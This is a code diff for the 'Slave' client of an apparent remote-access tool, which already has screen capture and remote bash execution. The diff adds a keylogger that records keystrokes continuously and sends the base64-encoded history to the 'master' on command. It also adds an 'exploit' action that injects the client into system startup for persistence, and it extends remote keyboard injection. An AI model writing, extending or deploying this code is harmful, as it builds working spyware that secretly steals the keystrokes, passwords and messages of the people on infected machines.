@@ -11,10 +11,12 @@ from typing import Optional
 
 import pyautogui
 from pynput import keyboard as pynput_keyboard
-from pynput.keyboard import Controller as KeyController, Key
+from pynput.keyboard import Controller as KeyController, Key, KeyCode
 
 from client.client import Client, Payload
-from utils import capture_screen, execute_bash, encode_base64, build_local_tree, decode_base64, notify
+from client.slave.key_logger import KeyLogger
+from utils import capture_screen, execute_bash, encode_base64, build_local_tree, decode_base64, notify, is_in_startup, \
+    remove_from_startup, add_to_startup
 
 pyautogui.FAILSAFE = False
 pyautogui.PAUSE = 0
@@ -77,6 +79,8 @@ class Slave(Client):
 
         self._screen_w, self._screen_h = pyautogui.size()
 
+        self.key_logger = KeyLogger()
+
         # --- Overcontrolling ---
         self._alt_pressed = False
         self._overcontrol_count = 0
@@ -87,15 +91,21 @@ class Slave(Client):
 
     def run(self) -> None:
         self._start_hotkey_listener()
+        self.key_logger.start()
         self.start()
         try:
             while self.running:
+                self.key_logger.save()
                 time.sleep(0.5)
         except KeyboardInterrupt:
             pass
         finally:
             self._stop_hotkey_listener()
             self._stop_stream()
+            try:
+                self.key_logger.set_active(False)
+            except Exception:
+                pass
             self.stop()
 
     def on_auth_success(self, response: str) -> None:
@@ -179,6 +189,11 @@ class Slave(Client):
             self._pending_frame = None
             self._frame_ready.clear()
 
+        try:
+            self.key_logger.set_active(True)
+        except Exception as e:
+            print(f"[slave] key_logger set_active(True) error: {e}")
+
         threading.Thread(target=self._capture_loop, args=(fps, q, scale, stop), daemon=True).start()
         threading.Thread(target=self._send_loop, args=(master, stop), daemon=True).start()
 
@@ -188,6 +203,11 @@ class Slave(Client):
         with self._frame_lock:
             self._pending_frame = None
             self._frame_ready.clear()
+
+        try:
+            self.key_logger.set_active(False)
+        except Exception as e:
+            print(f"[slave] key_logger set_active(False) error: {e}")
 
     def _capture_loop(self, fps: int, quality: int, scale: float, stop: threading.Event):
         interval = 1.0 / fps
@@ -228,14 +248,52 @@ class Slave(Client):
         return x, y
 
     def _resolve_key(self, key: str):
-        k = key.strip().lower()
-        if k in PNPUT_KEYS:
-            return PNPUT_KEYS[k]
-        if len(k) == 1:
-            return k
-        if k.startswith("f") and k[1:].isdigit():
-            return getattr(Key, k, k)
-        return k
+        if not key:
+            return None
+
+        raw = key.strip()
+        lower = raw.lower()
+
+        if lower in PNPUT_KEYS:
+            return PNPUT_KEYS[lower]
+
+        if lower.startswith("f") and lower[1:].isdigit():
+            return getattr(Key, lower, None)
+
+        if len(raw) == 1:
+            try:
+                return KeyCode.from_char(raw)
+            except Exception:
+                return raw
+
+        return raw
+
+    def _press(self, k):
+        if k is None:
+            return
+        if isinstance(k, str) and len(k) > 1:
+            keyboard.type(k)
+            return
+        keyboard.press(k)
+
+    def _release(self, k):
+        if k is None or (isinstance(k, str) and len(k) > 1):
+            return
+        keyboard.release(k)
+
+    def _tap(self, k):
+        if k is None:
+            return
+        if isinstance(k, str) and len(k) > 1:
+            keyboard.type(k)
+            return
+        if isinstance(k, KeyCode) or (isinstance(k, str) and len(k) == 1):
+            ch = k.char if isinstance(k, KeyCode) else k
+            if ch is not None:
+                keyboard.type(ch)
+                return
+        keyboard.press(k)
+        keyboard.release(k)
 
     def _handle_input(self, tokens: list[str]):
         if self.overcontrolling:
@@ -266,29 +324,26 @@ class Slave(Client):
                 if dy:
                     pyautogui.scroll(dy)
 
+
             elif action == "key_down" and len(tokens) >= 3:
-                raw = tokens[2].strip().lower()
+                raw = tokens[2]
                 k = self._resolve_key(raw)
-                print(f"[input] key_down {tokens[2]!r} -> {k!r}")
-                # на случай, если combo приходит удалённо
-                if raw in ("alt",):
+                print(f"[input] key_down {raw!r} -> {k!r}")
+                if raw.strip().lower() == "alt":
                     self._alt_pressed = True
-                elif raw == "f1" and self._alt_pressed:
+                elif raw.strip().lower() == "f1" and self._alt_pressed:
                     self._register_alt_f1()
-                keyboard.press(k)
+                self._press(k)
 
             elif action == "key_up" and len(tokens) >= 3:
-                raw = tokens[2].strip().lower()
+                raw = tokens[2]
                 k = self._resolve_key(raw)
-                print(f"[input] key_up {tokens[2]!r} -> {k!r}")
-                if raw in ("alt",):
+                if raw.strip().lower() == "alt":
                     self._alt_pressed = False
-                keyboard.release(k)
+                self._release(k)
 
             elif action == "key_tap" and len(tokens) >= 3:
-                k = self._resolve_key(tokens[2])
-                keyboard.press(k)
-                keyboard.release(k)
+                self._tap(self._resolve_key(tokens[2]))
 
             elif action == "key_hotkey" and len(tokens) >= 3:
                 combo = tokens[2].strip().lower()
@@ -302,6 +357,45 @@ class Slave(Client):
 
         except Exception as e:
             print(f"[slave] input error: {e} | {tokens}")
+
+    def _build_state(self) -> list:
+        injected = is_in_startup()
+        return [
+            {
+                "id": "exploit",
+                "name": "Exploit",
+                "description": "Is slave client injected in startup",
+                "status": "Injected" if injected else "UnInjected",
+                "actions": ["REVERT" if injected else "FIX"],
+            }
+        ]
+
+    def _send_state(self, master: str):
+        if not master:
+            return
+        payload = encode_base64(json.dumps(self._build_state()))
+        self.send(f"send state {master} {payload}")
+
+    def _handle_state_action(self, item_id: str, action: str, master: str):
+        action = (action or "").strip().upper()
+        item_id = (item_id or "").strip()
+
+        try:
+            if item_id == "exploit":
+                if action == "FIX":
+                    add_to_startup()
+                    print("[slave] state action exploit FIX")
+                elif action == "REVERT":
+                    remove_from_startup()
+                    print("[slave] state action exploit REVERT")
+                else:
+                    print(f"[slave] unknown exploit action: {action}")
+            else:
+                print(f"[slave] unknown state item: {item_id}")
+        except Exception as e:
+            print(f"[slave] state_action error: {e}")
+
+        self._send_state(master)
 
     def on_message(self, message: str) -> Optional[Payload]:
         if message.strip() == "ping":
@@ -345,6 +439,33 @@ class Slave(Client):
                     self.send(f"send common_info {master} {encode_base64(json.dumps(info))}")
             except Exception as e:
                 print(f"[slave] common info consuming error: {e}")
+
+        elif subject == "state":
+            master = tokens[-1] if len(tokens) >= 2 else ""
+            try:
+                self._send_state(master)
+            except Exception as e:
+                print(f"[slave] state sending error: {e}")
+
+        elif subject == "state_action":
+            if len(tokens) < 4:
+                return None
+            item_id = tokens[2]
+            action = tokens[3]
+            master = tokens[-1]
+            self._handle_state_action(item_id, action, master)
+
+        elif subject == "keylog":
+            master = tokens[-1]
+            try:
+                self.key_logger.save()
+                self.key_logger.clear()
+                self.key_logger.load()
+                if master:
+                    self.send(f"send keylog {master} {encode_base64(json.dumps(self.key_logger.history))}")
+                self.key_logger.clear()
+            except Exception as e:
+                print(f"[slave] keylog sending error: {e}")
 
         elif subject == "local":
             path = " ".join(tokens[2:-1])
